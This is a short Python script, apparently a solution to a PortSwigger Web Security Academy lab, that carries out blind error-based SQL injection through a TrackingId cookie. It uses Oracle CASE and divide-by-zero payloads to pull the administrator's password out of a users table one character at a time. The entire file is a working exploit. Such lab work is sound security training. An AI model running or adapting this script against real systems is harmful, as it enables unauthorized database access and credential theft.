import string
import requests
import logging
import sys 

def send_request(url, cookie):
    headers = {'Cookie': cookie}
    response = requests.get(url, headers=headers)
    return response

def run_script(url, cookie):
    tracking_cookie = cookie
    password = ''
    logging.info('[*] Recherche du mot de passe de l\'administrateur : ')

    for depth in range(20):  
        found_char = False

        for char in string.ascii_letters + string.digits:
            injected_cookie = f"{tracking_cookie}'||(SELECT CASE WHEN SUBSTR(password,{depth + 1},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            response = send_request(url, injected_cookie)
            if 'Internal Server Error' in response.text:
                password += char
                sys.stdout.write(char)
                sys.stdout.flush()
                found_char = True
                break

        if not found_char:
            break

    if password:
        logging.info(f'\n[*] Mot de passe trouvé : {password}')

    else:
        logging.info('Password not found')


def main():
    logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.INFO)
    target_url = 'https://0aba00900478165581001b54008c0037.web-security-academy.net/filter'
    tracking_cookie = 'TrackingId=LkXoRn86MoN4bHn1'

    run_script(target_url, tracking_cookie)

if __name__ == "__main__":
    main()
